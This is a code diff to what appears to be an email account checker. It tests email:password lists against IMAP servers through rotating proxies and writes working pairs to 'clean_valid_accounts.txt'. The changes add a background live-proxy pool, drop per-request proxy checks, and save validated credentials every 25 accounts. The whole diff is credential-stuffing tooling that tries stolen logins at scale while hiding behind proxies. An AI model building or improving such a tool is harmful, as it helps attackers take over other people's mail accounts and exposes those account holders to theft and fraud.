@@ -164,6 +164,9 @@ proxy_lock = threading.Lock()
 file_write_lock = threading.Lock()
 session_state_lock = threading.Lock()
 bad_proxies = set()
+alive_pool = []
+alive_pool_lock = threading.Lock()
+pool_refresher_on = False
 consecutive_proxy_failures = defaultdict(int)
 circuit_breaker_until = {}
 failed_domain_cache = {}
@@ -1393,6 +1396,43 @@ def get_servers(email):
             "pop3": fallback_patterns
         }
 
+def refresh_alive_pool():
+    try:
+        raw = get_filtered_active_proxies()
+    except Exception:
+        raw = []
+    live = []
+    for p in raw:
+        if precheck_proxy_fast(p):
+            live.append(p)
+    with alive_pool_lock:
+        alive_pool[:] = live
+    with proxy_lock:
+        bad_proxies.clear()
+        now = time.time()
+        expired = [k for k, v in circuit_breaker_until.items() if now >= v]
+        for k in expired:
+            circuit_breaker_until.pop(k, None)
+
+def start_alive_refresher():
+    global pool_refresher_on
+    if pool_refresher_on:
+        return
+    pool_refresher_on = True
+    def loop():
+        while True:
+            try:
+                refresh_alive_pool()
+            except Exception:
+                pass
+            time.sleep(15)
+    threading.Thread(target=loop, daemon=True).start()
+
+def sample_alive_proxy():
+    with alive_pool_lock:
+        pool = list(alive_pool)
+    return random.choice(pool) if pool else None
+
 def precheck_proxy_fast(proxy_str):
     try:
         if not proxy_str:
@@ -1443,9 +1483,6 @@ def proxy_connect(host, port, proxy_str, timeout=None):
     info = parse_proxy(proxy_str)
     if not info or not SOCKS_OK:
         raise RuntimeError("bad proxy format or socks unavailable")
-
-    if not is_proxy_alive(info["host"], info["port"], timeout=2):
-        raise RuntimeError("proxy connect failed")
 
     sock = None
     proxy_types_to_try = []
@@ -1745,13 +1782,11 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
         px = None
         if proxy_pool and proxy_mode != "off":
             if proxy_mode == "sticky":
-                if not thread_state.get("sticky_proxy") or not precheck_proxy_fast(thread_state.get("sticky_proxy")):
-                    available_candidates = [p for p in proxy_pool if precheck_proxy_fast(p)]
-                    thread_state["sticky_proxy"] = random.choice(available_candidates) if available_candidates else None
+                if not thread_state.get("sticky_proxy"):
+                    thread_state["sticky_proxy"] = sample_alive_proxy()
                 px = thread_state["sticky_proxy"]
             else:
-                available_candidates = [p for p in proxy_pool if precheck_proxy_fast(p)]
-                px = random.choice(available_candidates) if available_candidates else None
+                px = sample_alive_proxy()
         
         current_px = None
         proxies_to_try = [px] if px else [None]
@@ -1761,8 +1796,6 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
         max_attempts = min(len(conf.get("imap", [])), 2)
 
         for current_px in proxies_to_try:
-            if current_px and not precheck_proxy_fast(current_px):
-                continue
 
             for server in conf.get("imap", [])[:max_attempts]:
                 trace_logs.append(f"{px_tag(current_px)} Attempting IMAP -> Host: {server}:993")
@@ -1850,6 +1883,8 @@ with col_action2:
 active_proxy_pool = get_filtered_active_proxies()
 
 if start_engine_btn:
+    start_alive_refresher()
+    refresh_alive_pool()
     log_startup(f"Live checking engine execution triggered in [{CFG['MODE_NAME']}] mode on category: [{engine_action_mode}].")
     
     resume_lines = []
@@ -1991,19 +2026,6 @@ if start_engine_btn:
 
                                 pending_unfinished = checked_count
 
-                                # Immediately update clean_valid_accounts.txt on disk so unfinished runs retain valid accounts instantly
-                                try:
-                                    os.makedirs(CFG["RESULTS_DIR"], exist_ok=True)
-                                    with file_write_lock:
-                                        with open("clean_valid_accounts.txt", "w", encoding="utf-8") as outfile:
-                                            outfile.write(f"# Unfinished/Live Sync | Total Clean Valid: {len(str_lit.session_state.valid_results)}\n")
-                                            for v_item in str_lit.session_state.valid_results:
-                                                if ":" in v_item:
-                                                    em_part, rem_part = v_item.split(":", 1)
-                                                    pwd_part = rem_part.split("|")[0].strip()
-                                                    outfile.write(f"{em_part.strip()}:{pwd_part}\n")
-                                except Exception:
-                                    pass
 
                                 valid_len = len(str_lit.session_state.valid_results)
                                 wrong_len = len(str_lit.session_state.wrong_results)
@@ -2038,12 +2060,25 @@ if start_engine_btn:
                     if checked_count % 25 == 0 or checked_count == total_accs:
                         with session_state_lock:
                             done = set(str_lit.session_state.checked_emails_set)
+                            valids = list(str_lit.session_state.valid_results)
                         left = []
                         for raw in all_target_accounts:
                             em = raw.split(":", 1)[0].strip().lower() if ":" in raw else raw
                             if em not in done:
                                 left.append(raw)
                         save_unfinished("stopped or connection cut before finish", left, checked_count, total_accs)
+                        try:
+                            os.makedirs(CFG["RESULTS_DIR"], exist_ok=True)
+                            with file_write_lock:
+                                with open("clean_valid_accounts.txt", "w", encoding="utf-8") as outfile:
+                                    outfile.write(f"# Live sync | this run valid {len(valids)}\n")
+                                    for v_item in valids:
+                                        if ":" in v_item:
+                                            em_part, rem_part = v_item.split(":", 1)
+                                            pwd_part = rem_part.split("|")[0].strip()
+                                            outfile.write(f"{em_part.strip()}:{pwd_part}\n")
+                        except Exception:
+                            pass
                     if total_accs > 0:
                         pct = min(1.0, checked_count / total_accs)
                         progress_bar.progress(pct, text=f"Checking accounts [{engine_action_mode}]: {checked_count}/{total_accs} completed ({int(pct*100)}%)")
